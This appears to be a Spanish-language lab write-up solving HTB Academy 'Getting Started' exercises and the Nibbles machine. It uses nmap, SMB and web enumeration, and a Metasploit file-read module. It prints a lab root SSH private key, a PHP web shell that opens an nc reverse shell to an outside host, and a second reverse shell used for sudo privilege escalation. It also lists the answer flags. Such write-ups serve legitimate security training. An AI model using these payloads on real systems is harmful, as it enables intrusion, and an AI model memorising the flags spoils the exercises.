# Getting Started

## Pentesting Basics

### Basic Tools

1. **Apply what you learned in this section to grab the banner of the above server and submit it as the answer.** 

```
nc 154.57.164.69 31920
```

La herramienta nc conocida también como **netcat** sirve para abrir conexiones TCP/UDP, escuchar puertos, transferir datos y hacer pruebas rápidas de red. En este comando intenta abrir una conexión hacia esa IP y ese puerto. Si el puerto responde, verás algo como un banner, un prompt o datos del servicio; si no responde, el puerto puede estar cerrado o filtrado.

<p align="center"> 
<img src="images/nc.png" width="600" alt="Resultado de Nmap">
</p>

answer: **SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.1**

### Service Scanning

1. **Perform an Nmap scan of the target. What does Nmap display as the version of the service running on port 8080?**

```
sudo nmap -p- --open -sS -sC -sV 10.129.9.65 
```

<p align="center"> 
<img src="images/nmapppp.png" width="600" alt="Resultado de Nmap">
</p>

answer: **Apache Tomcat**

2. **Perform an Nmap scan of the target and identify the non-default port that the telnet service is running on.**

Con el comando anterior encontramos el numero del servicio telnet

answer: **2323**

3. **List the SMB shares available on the target host. Connect to the available share as the bob user. Once connected, access the folder called 'flag' and submit the contents of the flag.txt file.**

```
smbclient -N -L //10.129.9.65/ 
```

<p align="center"> 
<img src="images/smbclientttt.png" width="600" alt="Resultado de Nmap">
</p>

A lo largo del contenido obtenemos las siguientes credenciales: **bob:Welcome1**

```
smbclient -U bob //10.129.9.65/users
cd flag
get flag.txt
```

<p align="center"> 
<img src="images/smbclientttbob.png" width="600" alt="Resultado de Nmap">
</p>

answer: **dceece590f3284c3866305eb2473d099**

### Web Enumeration

1. **Try running some of the web enumeration techniques you learned in this section on the server above, and use the info you get to get the flag.**

Cuando activamos el laboratorio nos dará una ip y un número de puerto. Eso lo usaremos en el navegador:

```
http://154.57.164.80:32702/
```

<p align="center"> 
<img src="images/welcomeeee.png" width="600" alt="Resultado de Nmap">
</p>

Siempre que tengamos un servicio web tenemos que usar el archivo **robots.txt** ya que a veces nos pueden soltar credenciales o rutas críticas.

```
http://154.57.164.80:32702/robots.txt
```

<p align="center"> 
<img src="images/robotssss.png" width="600" alt="Resultado de Nmap">
</p>

```
http://154.57.164.80:32702/admin-login-page.php/
```

Las credenciales para acceder al login se encuentra en el código fuente de la pagina y así obtenemos la flag.

<p align="center"> 
<img src="images/credencialeeesss.png" width="600" alt="Resultado de Nmap">
</p>

answer: **HTB{w3b_3num3r4710n_r3v34l5_53cr375}**

### Public Exploits

1. **Try to identify the services running on the server above, and then try to search to find public exploits to exploit them. Once you do, try to get the content of the '/flag.txt' file. (note: the web server may take a few seconds to start)**

En esta ocasión usaremos metasploit 

```
msfconsole
```

Me ha estado dando problemas a la hora de usar un módulo específico para ello tuve que usar el siguiente comando:

```
reload_all
```

Y ya partir de ahí haremos lo siguiente:

```
search WordPress 2.7.1
use 0
set RHOST 154.57.164.64
set RPORT 55388
set FILEPATH /flag.txt
```

<p align="center"> 
<img src="images/wp_simple_backup_file_read.png" width="600" alt="Resultado de Nmap">
</p>

```
run
```

<p align="center"> 
<img src="images/txtxxtxt.png" width="600" alt="Resultado de Nmap">
</p>

Leemos el archivo obtenido para la flag.

answer: **HTB{my_f1r57_h4ck}**

### Privilege Escalation 

1. **SSH into the server above with the provided credentials, and use the '-p xxxxxx' to specify the port shown above. Once you login, try to find a way to move to 'user2', to get the flag in '/home/user2/flag.txt'.**

SSH to with user "<font color="#00b050">user1</font>" and password "<font color="#c00000">password1</font>"

```
ssh user1@154.57.164.79 -p 31661
sudo -l
sudo -u user2 /bin/bash
cat /user2/flag.txt
```

answer: **HTB{l473r4l_m0v3m3n7_70_4n07h3r_u53r}**

2. **Once you gain access to 'user2', try to find a way to escalate your privileges to root, to get the flag in '/root/flag.txt'.**

En esta ocasión, retomando el usuario anterior, **user2**, nos vamos a la siguiente ruta

```
cat \root\.ssh\id_rsa
```

> -----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

Lo guardo en nuestra kali con el nombre **id_rsa** 

```
chmod 600 id_rsa
ssh root@154.57.164.79 -p 31661 -i id_rsa
```

Obtenemos la flag de **root**

answer: **HTB{pr1v1l363_35c4l4710n_2_r007}**

## Attacking Your First Box

### Enumeration

1. **Run an nmap script scan on the target. What is the Apache version running on the server? (answer format: X.X.XX)**

**HTB** nos proporciona la ip de la máquina objetivo **10.129.12.250**

**Ping**

Dependiendo del resultado podemos deducir si es una máquina linux o window, por ejemplo:

```
ping -c 1 10.129.12.250
```

**Su ttl es 63. Por tanto, es Linux**
 
**Escaneo de puertos abiertos**

**Escaneo de puerto TCP**

El comando que uso con nmap es:

```
nmap -sV -sC -sS --open 10.129.12.250
```

<p align="center"> 
<img src="images/nmap.png" width="600" alt="Resultado de Nmap">
</p>

| Open port | Service | Version                                                      |
| --------- | ------- | ------------------------------------------------------------ |
| 22        | ssh     | OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) |
| 80        | http    |  Apache httpd 2.4.18 ((Ubuntu))                              |

answer: **2.4.18**

### Initial Foothold

1. **Gain a foothold on the target and submit the user.txt flag**

**Exploración**

Investigando el codigo fuente de la pagina web me encuentro lo siguiente: 

<p align="center"> 
<img src="images/Nibbles.png" width="600" alt="Resultado de Nmap">
</p>

**Fuzzing web**

```
gobuster dir -u http://10.129.12.250/nibbleblog/ -w /usr/share/dirb/wordlists/common.txt
```

<p align="center"> 
<img src="images/Nibles.png" width="600" alt="Resultado de Nmap">
</p>

Luego en el fichero README nos dice que versión tiene:

<p align="center"> 
<img src="images/Nibbles-1.png" width="600" alt="Resultado de Nmap">
</p>

Intento acceder al apartado de administración de la maquina con la sorpresa de que me encuentro investigando, el usuario **admin**, y la contraseña **nibbles** suponiendo como la maquina se llama nibbles y acierto 

<p align="center"> 
<img src="images/Nibles-1.png" width="600" alt="Resultado de Nmap">
<img src="images/admin.png" width="600" alt="Resultado de Nmap">
</p>

**Explotación**

Situándonos en **Plugins - My image** subiendo una imagen **.php** con el siguiente contenido dentro de la imagen:

```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.171 4443 >/tmp/f"); ?>
```

Nos saldrá mucho errores pero funcionará

<p align="center"> 
<img src="images/php.png" width="600" alt="Resultado de Nmap">
</p>

Luego nos situamos en la ruta donde se ha guardado la imagen `http://10.129.14.56/nibbleblog/content/private/plugins/my_image/`

Logramos acceder dentro del sistema

<p align="center"> 
<img src="images/nc 1.png" width="600" alt="Resultado de Nmap">
</p>

Podemos conseguir la flash del user.txt

answer: **79c03865431abf47b90ef24b9695e148**

### Privilege Escalation

1. **Escalate privileges and submit the root.txt flag.**

**Explotación Posterior**
**TTY** 

```
python3 -c "import pty;pty.spawn('/bin/bash')"
```

**Escalada de Privilegios**

```
sudo -l
```

<p align="center"> 
<img src="images/sudo.png" width="600" alt="Resultado de Nmap">
</p>

Esto significa que la ruta **/home/nibbler/personal/stuff/monitor.sh** tiene permiso de sudo

En la carpeta de nibbler habra un .zip lo compromimos con el comando **unzip** luego nos situamos donde se encuentra el script .sh y hacemos lo siguiente:

```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.171 8443 >/tmp/f' > monitor.sh
```

Después activamos el puerto de escucha

```
nc -lvnp 8443
```

Luego activamos el script con el siguiente comando 

```
sudo /home/nibbler/personal/stuff/monitor.sh
```

<p align="center"> 
<img src="images/root.png" width="600" alt="Resultado de Nmap">
</p>

answer: **de5e5d6619862a8aa5b9b212314e0cdd**

**Conclusión**

La máquina _Nibbles_ de HTB Academy es una excelente opción para quienes están empezando en CTF, porque enseña un flujo básico y muy realista: enumeración inicial, análisis de una aplicación web y escalada de privilegios en Linux. A pesar de ser de dificultad fácil, refuerza la importancia de ir con calma, tomar notas y no confiarse, ya que pequeños mecanismos de protección (como el bloqueo por intentos) pueden hacerte perder tiempo si no enumeras bien.

## What's Next?

### Knowledge Check

Para leer el write ups de la maquina GetSimple lee
<a href="GetSimple/GetSimple.md">aquí</a>

1. **Spawn the target, gain a foothold and submit the contents of the user.txt flag.**

answer: **7002d65b149b0a4d19132a66feed21d8**

2. **After obtaining a foothold on the target, escalate privileges to root and submit the contents of the root.txt flag.**

answer: **f1fba6e9f71efb2630e6e34da6387842**